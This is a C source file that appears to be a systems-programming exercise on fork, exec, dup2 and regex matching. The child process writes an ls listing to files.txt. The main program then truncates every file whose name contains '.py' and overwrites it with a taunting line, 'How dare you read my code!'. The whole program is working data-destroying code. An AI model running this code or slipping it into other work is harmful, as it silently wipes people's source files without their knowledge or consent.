/*************************************************************************
	> File Name: frzx.c
	> Author: x
	> Mail: x.com
	> Created Time: 2018年11月16日 星期五 18时08分51秒
 ************************************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <regex.h>

int main() {
    int status;
    pid_t child = fork();
    if (child == 0) {
        /*Your code here.*/
        int fd = open("files.txt", O_CREAT|O_RDWR, S_IRUSR|S_IWUSR);
        if (fd == -1) {
            printf("Error!\n");
            exit(-1);
        }
        int success = dup2(fd, 1);
        if (success == -1) {
            printf("Error!\n");
            exit(-1);
        }
        execlp("ls", "ls", (char*)NULL);
    	printf("Exec failed!\n");
    	exit(-1);
    } else {
        wait(&status);
        if (status != 0) {
            printf("Child failed!\n");
            return -1;
        }
    }
    char* to_write = "How dare you read my code!";
    int write_length = strlen(to_write);
    /*Part 2*/
    regex_t c_pattern;
    int result;
    
    if (regcomp(&c_pattern, "[A-Za-z0-9_]*\\.py", 0)) {
        printf("Compilation failed!\n");
        return -1;
    }
    
	int files = open("files.txt", O_RDONLY);
    if (files == -1) {
        printf("Failed to open files.txt!\n");
        return -1;
    }
    int length = lseek(files, 0, SEEK_END);
    lseek(files, 0, SEEK_SET);
    char *buffer = calloc(length, sizeof(char));
    if (read(files, buffer, length) == -1) {
        printf("Failed to read!\n");
        return -1;
    }
    
    char *filename = strtok(buffer, "\n");
    while (filename != NULL) {
        result = regexec(&c_pattern, filename, 0, NULL, 0);
        if (!result) {
            int code_file = open(filename, O_WRONLY|O_TRUNC);
            if (code_file == -1) {
                printf("Failed to open!\n");
                return -1;
            }
            write(code_file, to_write, write_length);
            fsync(code_file);
            close(code_file);
        } else if (result != REG_NOMATCH) {
            printf("Error matching!\n");
            return -1;
        }
        filename = strtok(NULL, "\n");
    }
    close(files);
    return 0;
}
